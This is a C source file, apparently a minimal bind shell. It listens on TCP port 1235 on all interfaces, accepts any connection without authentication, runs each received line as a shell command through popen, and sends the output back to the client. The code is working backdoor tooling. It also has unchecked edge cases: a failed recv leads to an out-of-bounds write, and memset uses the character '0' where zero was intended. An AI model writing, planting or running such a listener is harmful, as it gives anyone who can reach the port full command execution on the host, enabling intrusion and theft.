#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

int main(int argc, char* argv[]){
	
	int s;
	struct sockaddr_in addr;
	
	memset(&addr, '0', sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(1235);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	
	if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		printf("Error Creating Socket\n");
		return 0;
	}
	 int opt_val = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof opt_val);
    
	if(bind(s, (struct sockaddr *) &addr, sizeof(addr)) < 0){
		printf("Error Binding Socket\n");
		return 0;
	}
	
	if(listen(s, 128) < 0){
		printf("Error Listenting\n");
		return 0;
	}
	char buf[BUFFER_SIZE];
	while(1){
		int c;
        if ((c = accept(s, (struct sockaddr *) NULL, NULL)) < 0){ 
			printf("Error Creating Connection\n");
			return 0;
		}
		
		while (1){
			int read_size;
			if(!(read_size = recv(c, buf, BUFFER_SIZE, 0)))
				break;
			
			buf[read_size-2] = '\0'; //Replace 0d0a ( CR LF ) with 00 (NULL)

			FILE *cmd_out = popen(buf, "r");
			if(cmd_out == NULL)
				return 0;
				
			char line_buf[1024];
			while(fgets(line_buf, 1024, cmd_out) != NULL)
				 send(c, line_buf, strlen(line_buf), 0);
			pclose(cmd_out);
		}
	}
	
	return 1;
}
	
